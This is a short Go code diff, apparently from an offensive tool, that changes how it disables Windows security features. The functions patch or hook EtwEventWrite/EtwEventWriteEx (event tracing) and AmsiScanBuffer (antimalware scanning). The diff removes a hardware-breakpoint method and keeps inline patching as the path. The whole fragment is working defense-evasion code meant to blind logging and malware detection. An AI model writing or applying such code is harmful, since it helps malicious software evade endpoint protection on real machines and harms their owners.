@@ -89,13 +89,6 @@ func patchETWHardware() {
 	if proc == 0 {
 		return
 	}
-	if setHardwareBreakpoint(proc, 0) {
-		procEx, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWriteEx\x00")))
-		if procEx != 0 {
-			setHardwareBreakpoint(procEx, 1)
-		}
-		return
-	}
 	patchETWInline()
 }
 
@@ -110,9 +103,6 @@ func patchAMSIHardware() {
 	}
 	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("AmsiScanBuffer\x00")))
 	if proc == 0 {
-		return
-	}
-	if setHardwareBreakpoint(proc, 2) {
 		return
 	}
 	patchAMSI()
